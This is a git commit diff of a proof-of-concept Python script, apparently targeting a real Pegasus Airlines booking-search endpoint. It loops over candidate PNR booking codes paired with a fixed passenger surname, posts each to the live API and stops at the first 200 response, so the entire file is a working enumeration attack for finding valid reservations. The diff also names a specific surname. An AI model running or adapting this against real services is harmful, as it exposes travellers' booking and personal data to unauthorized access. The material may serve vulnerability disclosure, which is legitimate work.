6ea09f29ca5fdfa0e7402bdd8a7c2aedd3d9aebd
hackberr <131232029+hackberr@users.noreply.github.com>
2023-04-19 09:56:42 +0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,36 +1,31 @@
 import aiohttp
 import asyncio
 
-async def make_request(session, pnr_no):
+async def make_request(session, pnr_no, file):
     url = 'https://web.flypgs.com/pegasus/pnr-search/filtered/secured'
     payload = {"pnrNo": pnr_no, "surname": "ASLANBAŞ", "deleteOptionalSsr": True, "filter": "MMB"}
     headers = {
-        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
         "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "tr",
         "Accept-Encoding": "gzip, deflate",
         "Content-Type": "application/json",
         "X-Platform": "web",
-        "X-Version": "1.35.1",
-        "Access-Control-Allow-Origin": "*",
-        "Cache-Control": "no-cache, no-store, must-revalidate",
-        "Pragma": "no-cache",
-        "X-Dtpc": "35$75108566_563h19vKIIMHFPDFQURMQKFIUUETDCGMLWCRLEV-0e0"
+        "Cache-Control": "no-cache, no-store, must-revalidate"
     }
     async with session.post(url, json=payload, headers=headers) as response:
-        html_content = await response.json()
         print(f"{pnr_no} - {response.status}")
+        file.write(f"{pnr_no} - {response.status}\n")
         if response.status == 200:
-            return await response.json()        
-        else:
-            return None
+            await session.close()
+            await asyncio.sleep(1)
+            raise SystemExit
 
 async def main():
     async with aiohttp.ClientSession() as session:
         with open('output.txt', 'r') as f:
             pnr_numbers = [line.strip() for line in f.readlines()]
 
-        for pnr_no in pnr_numbers:
-            await make_request(session, pnr_no)
+        with open('status_codes.txt', 'w') as file:
+            for pnr_no in pnr_numbers:
+                await make_request(session, pnr_no, file)
 
 asyncio.run(main())
